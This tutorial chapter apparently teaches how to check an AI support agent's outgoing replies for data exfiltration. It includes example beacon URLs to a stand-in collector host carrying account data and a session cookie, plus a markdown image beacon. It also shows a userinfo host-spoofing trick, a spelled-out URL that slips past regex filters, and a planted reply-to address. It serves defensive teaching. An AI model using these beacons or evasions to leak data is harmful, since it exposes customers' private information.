# 4.2 — The channels a reply carries

## One-line answer

A URL allowlist over outgoing text catches the two channels that are links and none of the ones that
are not — a reply-to address, and the data itself sitting in the prose — so the honest description of
an outbound content check is that it narrows the pipe rather than closing it.

## The story

A prison has a rule that letters going out are read before they are posted. It is not a subtle rule
and everyone knows about it.

So the letters are read. Anything with an address in it, anything naming a person outside, anything
that looks like arranging something — held back.

What goes out are ordinary letters home. *The food is bad. My knee is better. Tell Auntie I was
asking after her. I have been thinking about the summer we spent at the caravan, and about how the
gate at the back was always stiff.*

Every word of that is allowed, and the last sentence is a message. Not because it contains anything
forbidden, but because two people who both remember the caravan know what the stiff gate means and
the person reading the letter does not.

You cannot read your way out of that. The channel is not the address or the phone number. The channel
is that a message is going from someone inside to someone outside at all.

## The idea in plain language

An **exfiltration channel** is any route by which information inside the system reaches somebody
outside it. Day 66 named exfiltration as the third leg of the lethal trifecta, and the usual worked
example is an agent with an email tool — because that one has a tool attached and is therefore the
one you can put a guardrail on.

The channels in a *drafted reply* are broader than that, and they get progressively harder:

1. **A link.** `https://collector.test/c?ref=4610&acct=alice` — the data is in the query string, and
   the exfiltration happens when the recipient's browser fetches it.
2. **A markdown image.** The same thing, except the fetch happens **automatically** when the message
   is rendered. Nobody has to click. If your reply is displayed in any client that renders markdown
   or HTML, an image URL is a silent, zero-interaction beacon.
3. **A reply-to address.** Not a URL at all. A sentence saying *"for urgent issues write to
   audit-team@…"* routes the next message, and the next message will contain whatever the customer
   says next.
4. **The data itself, in the prose.** *"We have seen this on tickets 4610 and 4633."* No link, no
   address, nothing to match. The information has left, in the one channel the desk exists to keep
   open.

A check over URLs addresses one and two. It cannot address four, and four is the caravan gate.

## Why Sutra needs it

Sutra's desk drafts a reply to a customer and that reply is the product. Day 58's graph ends there.

Day 66's threat model has a row for exfiltration, and the mitigation written against that row must be
honest about which of the four it covers, because the difference matters for what else has to be true.
Covering one and two means an injected instruction cannot easily set up an automatic beacon — a real
gain. Not covering four means an injected instruction *can* still cause the desk to summarise the
archive into a reply, and the only defences against that are structural: what the desk is allowed to
retrieve (Day 68) and what data is in the archive at all (Day 69).

If the threat model says "exfiltration is mitigated by outbound content filtering", it is claiming
four when it has one and two.

## The mechanism

```python
URL = re.compile(r"https?://[^\s<>\"')]+", re.I)
ALLOWED_HOSTS = {"support.example.com", "docs.example.com"}


def disallowed_urls(text: str) -> list[str]:
    """URLs whose host is not on the desk's allowlist."""
    bad = []
    for found in outbound_urls(text):
        host = found.split("//", 1)[-1].split("/", 1)[0].split(":")[0]
        if host not in ALLOWED_HOSTS:
            bad.append(found)
    return bad
```

**Line by line:**

- The character class `[^\s<>\"')]` stops the URL at whitespace and at the punctuation that commonly
  *follows* a URL in prose or markup. Getting this wrong in the permissive direction swallows the rest
  of the sentence into the "host"; getting it wrong in the strict direction truncates a URL before its
  query string, which is precisely where the exfiltrated data lives.
- The host is extracted by splitting rather than by `urlparse`, which is a deliberate simplification
  for teaching and **would be wrong in production** — `urlparse` handles userinfo (`https://good.com@evil.test/`),
  ports, IPv6 literals and case, and each of those is a documented way to defeat naive host extraction.
  This is named here rather than left as a trap.
- `.split(":")[0]` strips a port. Without it, `docs.example.com:8443` is not equal to
  `docs.example.com` and a legitimate link is refused.
- It returns the **list** of offending URLs rather than a boolean, because the alert needs to name
  them and because a reply carrying three bad links is a different event from one carrying one.

Measured on 2026-09-06:

```text
urls found     3
  allowed  https://docs.example.com/kb/104
  REFUSED  https://example-collector.test/c?ref=4610&acct=alice
  REFUSED  https://example-collector.test/i?d=session-cookie-4610

allowed hosts  ['docs.example.com', 'support.example.com']

The allowlist catches both URL channels and neither of the other two.
The address is not a URL. The ticket numbers are not a link at all -
they are data, travelling in the one channel nobody can close: the reply.
```

**Three URLs found, one allowed, two refused.** The check works exactly as designed. The legitimate
knowledge-base link goes through; the collector link and the markdown image are both caught, and the
image one is the valuable catch, because that is the channel that fires without anybody clicking.

**And the draft contained four channels.** The reply-to address `audit-team@example-collector.test`
is still in the text — it is not a URL, so a URL scanner has nothing to say about it. And
*"tickets 4610 and 4633"* is still in the text, which is a customer's ticket history going to whoever
receives this reply.

The last one is the one to sit with, because there is no version of this check that catches it. The
desk's entire job is to put relevant prior information into a reply. An outbound filter that refused
to let ticket references into a reply would be refusing the product.

## When it breaks

The regex breaks, and it breaks in both directions.

Too permissive, and the host extraction is fooled. `https://docs.example.com@example-collector.test/x`
has a host of `example-collector.test` — everything before the `@` is userinfo — and the naive
`split("//")[-1].split("/")[0]` returns `docs.example.com@example-collector.test`, which is not in the
allowlist, so this particular case happens to fail closed. Reverse the check to a blocklist and the
same construction sails through. This is why the production answer is `urlparse` and not string
surgery, and why the code above says so.

Too strict, and you refuse ordinary replies. A customer writes *"the error page links to
https://status.example.com"* — a real host, not on the two-item allowlist — and the desk refuses to
send a reply quoting them. That is [5.2](../05-measure-it/5.2-refused-for-quoting-an-error.md)'s
failure mode arriving on the outbound side, and it is why an allowlist over outbound URLs needs the
same false-positive measurement as any inbound check.

There is one more break worth naming because it is invisible: **the model can spell a URL without
matching the regex.** `https colon slash slash collector dot test slash c` is not matched by anything
above, and a human or a rendering client can reconstruct it. Every text-matching outbound check has
this hole, and it is the same hole as
[3.4](../03-what-comes-in/3.4-letters-that-are-not-the-letters.md)'s spaced-out letters seen from the
other side.

## In production

**What a professional writes instead.** The outbound check is not a regex over prose. Replies are
rendered from a **template** with the free text in a designated slot, and links are emitted only from
a structured field the desk populates from its own knowledge base — so a URL in the body is not
filtered, it is simply not a thing the pipeline can produce. That converts the whole problem from a
filter into a boundary in [1.3](../01-the-ladder/1.3-a-sign-is-not-a-gate.md)'s sense, and it is
available here in a way it is not for the input side, because the desk controls the format of its own
output.

**What degrades at scale.** Allowlists of hostnames need maintenance, and the maintenance is done by
whoever is being blocked. A desk with two allowed hosts becomes a desk with forty, because every one
of them was added by somebody with a legitimate reason and a deadline. After a year the list contains
a partner's domain that has since changed hands, and nobody re-audits a list that only ever grows —
which is the same rot [5.3](../05-measure-it/5.3-five-more-words.md) measures on the phrase list.

**The failure that only shows with real traffic.** Rendering context. Whether a markdown image
auto-fetches depends entirely on where the reply is displayed, and a desk sends replies into email
clients, a web portal, a mobile app and a partner's ticketing system — four renderers with four
policies, none of which the desk controls or can test. The channel that is inert in your staging
environment is live in somebody's mail client.

**The review comment a senior engineer leaves:** *"Use `urlparse` for the host — the split will not
survive userinfo or a port, and I do not want to find out which way it fails. More importantly, write
in the threat model that this covers links and images only. The reply-to address and the ticket
numbers in the body are not covered by anything here, and if we write 'exfiltration mitigated'
somebody will believe it."*

**The interview question:** *"An agent can send a reply. How do you stop it leaking data?"* A good
answer refuses the premise of the question: *"You narrow it, you do not stop it. I would scan outgoing
text for URLs against an allowlist and I would be specific that this covers two channels — a link and
a markdown image, and the image is the one that matters because it fetches without a click. It does
not cover a reply-to address, and it cannot cover the data sitting in the prose, because putting
relevant prior information into a reply is what the product does. So the real controls are upstream:
what the agent is allowed to retrieve, and what is in the archive at all. The outbound filter buys you
the automatic beacons, which is worth having and is not the same as containment."*
